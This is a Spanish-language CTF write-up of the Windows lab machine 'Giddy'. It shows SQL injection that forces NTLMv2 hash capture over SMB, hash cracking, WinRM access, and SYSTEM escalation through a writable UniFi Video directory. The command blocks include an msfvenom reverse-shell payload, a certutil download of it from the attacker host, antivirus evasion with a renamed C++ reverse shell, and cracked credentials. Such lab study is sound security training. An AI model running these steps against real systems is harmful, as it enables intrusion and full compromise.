# Giddy

![](../../../../~gitbook/image.md)Publicado: 14 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
###📝 Descripción
Giddy es una máquina Windows de dificultad media que presenta múltiples vectores de ataque interesantes. La explotación inicial se logra a través de una vulnerabilidad de inyección SQL en una aplicación ASP.NET, permitiendo la captura de hashes NTLMv2 mediante técnicas de forzado de autenticación SMB. Una vez obtenido el acceso inicial, la escalada de privilegios se aprovecha de una configuración insegura en Ubiquiti UniFi Video, donde permisos heredados permiten la ejecución de código arbitrario como NT AUTHORITY\SYSTEM.Esta máquina es ideal para practicar técnicas de explotación web, cracking de hashes, evasión de antivirus y escalada de privilegios en entornos Windows.
###🎯 Objetivos
- User Flag: Obtener acceso inicial mediante SQL injection y hash cracking
- Root Flag: Escalar privilegios explotando permisos inseguros en servicios

###🔭 Reconocimiento

####🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####🔍 Escaneo de puertos

####🔧 Enumeración de servicios

###🌐 Enumeración Web

####🔗 80 HTTP
Enumeramos el servicio http en el puerto 80 y no es que haya gran cosa aparte de una divertida y peculiar imagen:![](../../../../~gitbook/image.md)📁 Fuzzing de directoriosRealizamos fuzzing de directorios para ver si encontramos algún recurso potencial que utilizar como vector de ataque. Para ello empleamos las herramientas dirsearch y feroxbuster:![](../../../../~gitbook/image.md)Encontramos únicamente dos recursos que analizar en profundidad "/remote" y "/mvc".🔐 /remote - Windows Powershell web accessEncontramos un panel de login de "Windows Powershell web access" aunque un mensaje nos indica que debemos autenticarnos desde la versión segura con https.http://10.10.10.104/Remote/en-US/logon.aspx?ReturnUrl=%2fremote%2flogin![](../../../../~gitbook/image.md)
####🕸️ /mvc - Aplicación en ASP.net
https://10.10.10.104/mvc/![](../../../../~gitbook/image.md)
####💉 Explotación Inicial - SQL Injection
🔍 Identificación de la vulnerabilidadAl enumerar la aplicación, vemos que se trata de un sitio web en desarrollo y cuando seleccionamos sobre algunos de los productos vemos un parámetro GET en la llamada que podría ser vulnerable a SQLi![](../../../../~gitbook/image.md)Confirmamos la vulnerabilidad y enumeramos un usuario llamado jnogueira:![](../../../../~gitbook/image.md)🎣 Captura de Hash NTLMv2Al tratarse de una máquina windows, una de las cosas que merece la pena probar es intentar obtener un hash NTLMv2 forzando a la autenticación por parte del usuario de servicio de la base de datos contra un recureso de un servidor smb que levantemos en nuestro host de ataque usando imapacket de la siguiente forma:Usamos el siguiente payload. El carácter ";" lo inyectamos para cerrar la cosulta e iniciar otra en la que haremos una petición a nuestro recurso compartido:![](../../../../~gitbook/image.md)🔓 Cracking del HashE inmediatamente recibimos un hash NTLMv2 de un usuario llamado stacy:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Intentamos crackearlo usando hashcat y obtenemos la contraseña de stacy![](../../../../~gitbook/image.md)Credenciales obtenidas: `stacy:xNnWo6272k7x`
####❌ Intento de conexión RDP
Verificamos que las credenciales son válidas con el servicio RDP sin embargo no parece que podamos conectarnos![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
####✅ Acceso vía WinRM
Verificamos si stacy está dentro del grupo Remote Management System y podemos acceder a través del protocolo winrm:![](../../../../~gitbook/image.md)Todo hace indicar que sí, así que usamos evil-winrm para ganar acceso a la máquinacon las credenciales de stacy:![](../../../../~gitbook/image.md)
####🌐 Autenticación alternativa con stacy a través de Windows Powershell Web Access
Podemos usar también las credenciales de stacy para acceder a la máquina a través de la herramienta WIndows Powershell Web access.NOTA: Importante aquí especificar el carácter \ delante del usuario:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Accedemos al directorio Desktop del usuario stacy y obtenemos la primera flag:
###### 🔝 Escalada de Privilegios

####🔍 Enumeración del sistema
Al enumerar el directorio Documents de Stacy vemos que contiene un archivo poco común:
####🎥 Investigación de Ubiquiti UniFi Video
Buscamos información pública sobre este archivo y parece pertenecer a
Ubiquiti UniFi Video un software de videovigilancia de Ubiquiti usado para gestionar cámaras IP.Buscamos posibles exploits sobre este software encontramos que existe uno y además que permite la escalada de privilegios en WIndows para la versión 3.7.3![](../../../../~gitbook/image.md)Exploit Reference: [https://www.exploit-db.com/exploits/43390](https://www.exploit-db.com/exploits/43390)
####🔧 Análisis del Exploit
Si miramos el detalle de la explotación nos indica que debería existir en el sistema una ruta: de instalación de la herramienta en C:\ProgramData\unifi-video que comprobamos que existe:![](../../../../~gitbook/image.md)
####📋 Resumen del Exploit
Ubiquiti UniFi Video para Windows se instala por defecto en `C:\ProgramData\unifi-video\` y también se entrega con un servicio llamado "Ubiquiti UniFi Video". Su ejecutable "avService.exe" se ubica en el mismo directorio y también se ejecuta bajo la cuenta NT AUTHORITY/SYSTEM.Los permisos predeterminados de la carpeta `C:\ProgramData\unifi-video` se heredan de `C:\ProgramData` y no se anulan explícitamente, lo que permite a todos los usuarios, incluso a los sin privilegios, añadir y escribir archivos en el directorio de la aplicación.Al iniciar y detener el servicio, se intenta cargar y ejecutar el archivo en `C:\ProgramData\unifi-video\taskkill.exe`. Sin embargo, este archivo no existe en el directorio de la aplicación por defecto.Al copiar un archivo `taskkill.exe` arbitrario en `C:\ProgramData\unifi-video\` como un usuario sin privilegios, es posible escalar privilegios y ejecutar código arbitrario como NT AUTHORITY/SYSTEM.
####🛠️ Explotación para Escalada
🧪 Primer intento - Payload con msfvenomGeneramos un payload con msfvenom:Inicio un servidor web en python en mi host de ataque para disponibilizar el payload:Y ahora usando certutil lo descargo en el directorio C:\ProgramData\unifi-video![](../../../../~gitbook/image.md)Pero parece que el antivirus Defender nos borra el ejecutable en cuanto lo detecta o en cuanto lo ejecutamos.
####🛡️ Evasión de Antivirus
Usaremos [prometheus](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)una simple shell inversa TCP de C++, que se usará para crear el archivo malicioso taskkill.exe. Se han cambiado los nombres de las funciones y se han eliminado los comentarios para reducir la probabilidad de detección por antivirus basado en firmas📥 Descarga y configuración de PrometheusDescargamos prometheus y editamos la IP y el puerto con el de nuestro host de ataque:![](../../../../~gitbook/image.md)Para compilar esta herramienta necesitaremos tener instalada la herramienta Mingw-w64.Compilamos con el siguiente comando![](../../../../~gitbook/image.md)
####🎯 Ejecución del Exploit
Ahora inicamos un listener con netcat en el host de ataque donde recibiré la conexión reversa:Transferimos nuevamente el binario taskkill.exe generado con prometheus al host Giddy usando certutil:Ahora nos queda únicamente detener e iniciar el servicio para que se realice la llamada a taskkill.exe como NT System. Pero antes debemos de saber cómo se llama el servicio y cómo detenerlo e iniciarlo.Buscamos el nombre del servicio en el registro de la siguiente forma:![](../../../../~gitbook/image.md)Reiniciamos el servicio (es posible que requiera parar e iniciar varias veces)Recibiremos la reverse shell como NT System:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🎯 Objetivos](#objetivos)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯  ping -c2 10.10.10.104
PING 10.10.10.104 (10.10.10.104) 56(84) bytes of data.
64 bytes from 10.10.10.104: icmp_seq=1 ttl=127 time=41.0 ms
64 bytes from 10.10.10.104: icmp_seq=2 ttl=127 time=42.2 ms

--- 10.10.10.104 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 40.967/41.571/42.175/0.604 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.104 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
80,443,3389,5985
```

```
nmap -sC -sV -p$ports 10.10.10.104 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 20:27 CEST
Nmap scan report for 10.10.10.104
Host is up (0.043s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: 2025-06-13T18:27:39+00:00; 0s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2025-06-12T18:18:53
|_Not valid after:  2025-12-12T18:18:53
| rdp-ntlm-info:
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2025-06-13T18:27:34+00:00
|_ssl-date: 2025-06-13T18:27:39+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

```
dirsearch -u http://10.10.10.104 -x 503,404
```

```
impacket-smbserver smbShare $(pwd) -smb2support
```

```
; EXEC MASTER.sys.xp_dirtree '\\10.10.14.7\smbShare\test'
```

```
hashcat -m 5600 -a 0  stacy_hash /usr/share/wordlists/rockyou.txt
```

```
netexec rdp 10.10.10.104 -u 'stacy' -p 'xNnWo6272k7x'
```

```
xfreerdp /u:'stacy' /p:'xNnWo6272k7x' /v:10.10.10.104 /drive:linux,/home/kpanic/
```

```
netexec winrm 10.10.10.104 -u 'stacy' -p 'xNnWo6272k7x'
```

```
evil-winrm -i 10.10.10.104 -u stacy -p 'xNnWo6272k7x'
```

```
*Evil-WinRM* PS C:\Users\Stacy\Desktop> dir

Directory: C:\Users\Stacy\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/13/2025   2:19 PM             34 user.txt
```

```
*Evil-WinRM* PS C:\Users\Stacy\Documents> dir

Directory: C:\Users\Stacy\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2018   9:36 AM              6 unifivideo
```

```
5. VULNERABILITY DETAILS
========================
Ubiquiti UniFi Video for Windows is installed to "C:\ProgramData\unifi-video\"
by default and is also shipped with a service called "Ubiquiti UniFi Video". Its
executable "avService.exe" is placed in the same directory and also runs under
the NT AUTHORITY/SYSTEM account.

However the default permissions on the "C:\ProgramData\unifi-video" folder are
inherited from "C:\ProgramData" and are not explicitly overridden, which allows
all users, even unprivileged ones, to append and write files to the application
directory:

c:\ProgramData>icacls unifi-video
unifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
BUILTIN\Administrators:(I)(OI)(CI)(F)
CREATOR OWNER:(I)(OI)(CI)(IO)(F)
BUILTIN\Users:(I)(OI)(CI)(RX)
BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)

Upon start and stop of the service, it tries to load and execute the file at
"C:\ProgramData\unifi-video\taskkill.exe". However this file does not exist in
the application directory by default at all.

By copying an arbitrary "taskkill.exe" to "C:\ProgramData\unifi-video\" as an
unprivileged user, it is therefore possible to escalate privileges and execute
arbitrary code as NT AUTHORITY/SYSTEM.

```

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.7 lport=443 -f exe > taskkill.exe
```

```
python3 -m http.server 80
```

```
certutil -urlcache -f -split http://10.10.14.7/taskkill.exe
```

```
wget https://raw.githubusercontent.com/paranoidninja/0xdarkvortex-MalwareDevelopment/refs/heads/master/prometheus.cpp
```

```
apt-get install g++-mingw-w64
```

```
i686-w64-mingw32-g++ prometheus.cpp -o taskkill.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

```
nc -nlvp 443
```

```
certutil -urlcache -f -split http://10.10.14.7/taskkill.exe
```

```
Set-Location 'HKLM:\SYSTEM\CurrentControlSet\Services'

dir *uni*
```

```
Name: UniFiVideoService
DisplayName: Ubiquiti UniFi Video
```

```
Stop-Service "Ubiquiti UniFi Video"
```

```
*Evil-WinRM* PS C:\ProgramData\unifi-video> Start-Service "Ubiquiti UniFi Video"
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to start...
*Evil-WinRM* PS C:\ProgramData\unifi-video> Stop-Service "Ubiquiti UniFi Video"
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
```

```
Start-Service "Ubiquiti UniFi Video"
```
